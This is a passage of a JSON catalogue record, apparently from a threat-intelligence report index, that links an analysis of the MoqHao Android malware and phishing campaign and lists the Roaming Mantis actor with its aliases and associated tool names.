            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-11 - MoqHao Android malware analysis and phishing campaign.pdf"
    ],
    "report_names": [
        "2022-08-11 - MoqHao Android malware analysis and phishing campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9bc28d0-ce98-4991-84ae-5036e5f9d4e3",
            "created_at": "2022-10-25T16:07:24.546437Z",
            "updated_at": "2025-03-27T02:02:10.277573Z",
            "deleted_at": null,
            "main_name": "Roaming Mantis",
            "aliases": [
                "Roaming Mantis Group",
                "Shaoye"
            ],
            "source_name": "ETDA:Roaming Mantis",
            "tools": [
                "MoqHao",
                "Roaming Mantis",
                "SmsSpy",
                "Wroba",
                "XLoader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c94cb0e9-6fa9-47e9-a286-c9c9c9b23f4a",
            "created_at": "2023-01-06T13:46:38.823793Z",
            "updated_at": "2025-03-27T02:00:02.928254Z",
            "deleted_at": null,
            "main_name": "Roaming Mantis",
            "aliases": [
                "Roaming Mantis Group"
            ],
            "source_name": "MISPGALAXY:Roaming Mantis",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536084,
    "ts_updated_at": 1743041404,
    "ts_creation_date": 1662027319,
    "ts_modification_date": 1662027319,
    "files": {
        "pdf": "https://archive.orkl.eu/d60baaf99497d552c23ebfd8d3ace03e0fcafa72.pdf",
        "text": "https://archive.orkl.eu/d60baaf99497d552c23ebfd8d3ace03e0fcafa72.txt",
        "img": "https://archive.orkl.eu/d60baaf99497d552c23ebfd8d3ace03e0fcafa72.jpg"
    }
}